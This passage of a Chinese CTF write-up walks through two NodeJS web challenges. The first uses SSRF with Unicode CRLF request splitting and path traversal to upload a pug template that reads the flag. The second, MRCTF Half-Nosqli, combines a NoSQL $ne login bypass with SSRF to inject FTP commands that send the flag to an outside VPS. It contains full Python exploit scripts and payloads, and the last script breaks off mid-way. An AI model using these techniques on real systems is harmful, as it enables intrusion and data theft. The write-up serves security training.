                return true
            }
        }
    }
    var server = app.listen(8081, function() {
        var host = server.address().address
        var port = server.address().port
        console.log("Example app listening at http://%s:%s", host, port)
    })
大概看一下几个路由：
  * /：会包含/template目录下的一个pug模板文件并用pub模板引擎进行渲染
  * /source：回显源码
  * /file_upload：限制了只能由127.0.0.1的ip将文件上传到uploads目录里面，所以需要进行ssrf。并且我们可以通过控制mimetype进行目录穿越，从而将文件上传到任意目录。
  * /core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。
根据上面几点，可以大致判断是利用SSRF伪造本地ip进行文件上传，上传一个pug模板文件（可以搜一下pug文件的代码格式[https://www.pugjs.cn/language/includes.html）到/template目录下，这个pug模板文件中含有将根目录里的flag包含进来的代码，然后用?action=来包含该文件，就可读取到flag。](https://www.pugjs.cn/language/includes.html%EF%BC%89%E5%88%B0/template%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%BF%99%E4%B8%AApug%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6%E4%B8%AD%E5%90%AB%E6%9C%89%E5%B0%86%E6%A0%B9%E7%9B%AE%E5%BD%95%E9%87%8C%E7%9A%84flag%E5%8C%85%E5%90%AB%E8%BF%9B%E6%9D%A5%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8?action=%E6%9D%A5%E5%8C%85%E5%90%AB%E8%AF%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%B1%E5%8F%AF%E8%AF%BB%E5%8F%96%E5%88%B0flag%E3%80%82)
看到`/core`路由，关键代码在这里：
    if (q) {
            var url = 'http://localhost:8081/source?' + q
            console.log(url)
            var trigger = blacklist(url);
            if (trigger === true) {
                res.send("error occurs!");
            } else {
                try {
                    http.get(url, function(resp) {
可以传入一个q参数，然后服务器去请求，这里就存在一个SSRF了，可以通过这个点，来进行一个拆分请求，从而可以利用刚刚的文件上传点将我们的文件上传上去。这就涉及到了前面讲的
NodeJS的Unicode编码造成的CRLF注入问题了。如果对Unicode编码经过精心的构造，就可以通过拆分请求实现的SSRF攻击（也就是一种CRLF注入），通过换行让服务端将我们的第一次请求下面构造的报文内容，当作一次单独的HTTP请求，而这个构造的请求就是我们的文件上传请求了。
接下来抓包并构造请求即可：
对抓取到的文件上传的数据包进行删除Cookie，并将Host、Origin、Referer等改为本地地址、Content-Type改为
`../template` 用于目录穿越（注意Content-Length也需要改成变化后的值），然后编写以下利用脚本：
    import urllib.parse
    import requests
    payload = ''' HTTP/1.1
    POST /file_upload HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 266
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://127.0.0.1:8081
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG01qmiZ5h6Ap0QSc
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://127.0.0.1:8081/?action=upload
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    ------WebKitFormBoundaryG01qmiZ5h6Ap0QSc
    Content-Disposition: form-data; name="file"; filename="shell.pug"
    Content-Type: ../template
    doctype html
    html
      head
        style
          include ../../../../../../../flag.txt
    ------WebKitFormBoundaryG01qmiZ5h6Ap0QSc--    
    GET / HTTP/1.1
    test:'''.replace("\n", "\r\n")
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0x0100+ord(i))
        return ret
    payload = payload_encode(payload)
    print(payload)
    r = requests.get('http://b5db3d85-4230-43f3-84d2-de9a952a0451.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))
    print(r.text)
执行脚本后即可成功进行目录穿越，将shell.pug文件上传到template目录中，然后访问 `/?action=shell` 即可得到flag：
## [2021 MRCTF]Half-Nosqli
进入题目，啥也没有，目录扫描找到了 `/docs`，访问得到一个Swagger UI：
有两个Api接口，一个是 `/login` 用于登录，另一个是 `/home` 可通过url属性进行
SSRF。我们可以编写脚本来访问这两个Api接口。首先访问 `/home`接口报错，因为需要验证，所以思路应该是先访问 `/login`
接口进行登录，登录后拿到token再去访问 `/home`
接口。这里由于题目提示了是NoSQL，所以我们直接使用NoSQL的永真trick绕过：
所以最终的脚本如下：
    import requests
    import json
    url = "http://node.mrctf.fun:23000/"
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}
    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    json_data2 = {
        "url":"http://47.101.57.72:4000"    # 通过这里的url值进行SSRF
    }
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
这样我们便可以通过 `/home` 接口的url值进行SSRF了，先访问一下自己的 VPS 试试：
成功。
然后接下来就是利用 Node JS 的 HTTP 响应拆分攻击构造 SSRF 去打他本地的 FTP，原理在前面的几节中已经讲得很清楚了。由于题目给出了
docker-compose.yml，在这里面发现了FTP的主机名为 `ftp`，端口为 8899。
构造 FTP 命令：
    USER anonymous
    PASS 
    CWD files
    TYPE I
    PORT 47,101,57,72,0,2000
    RETR flag
编写攻击脚本，并现在自己 VPS 上面测试：
    import requests
    import json
    url = "http://node.mrctf.fun:23000/"
    ftp_payload = ''' HTTP/1.1
    USER anonymous
    PASS 
    CWD files
    TYPE I
    PORT 47,101,57,72,0,2000
    RETR flag
    test:'''.replace("\n","\r\n")
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}
    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0x0100+ord(i))
        return ret
    ftp_payload = payload_encode(ftp_payload)
    print(ftp_payload)
    json_data2 = {
        "url":"http://47.101.57.72:8899/"+ftp_payload    # 通过这里的url值进行SSRF
    }
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
VPS 上面成功接收到了 FTP 命令，下面开始正式攻击，首先在自己 VPS 上监听 2000 端口等待 FTP 服务器的主动连接并用于后续的文件传输：
然后执行攻击脚本：
    import requests
    import json
    url = "http://node.mrctf.fun:23000/"
    ftp_payload = ''' HTTP/1.1
    USER anonymous
    PASS 
    CWD files
    TYPE I
    PORT 47,101,57,72,0,2000
    RETR flag
    test:'''.replace("\n","\r\n")
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}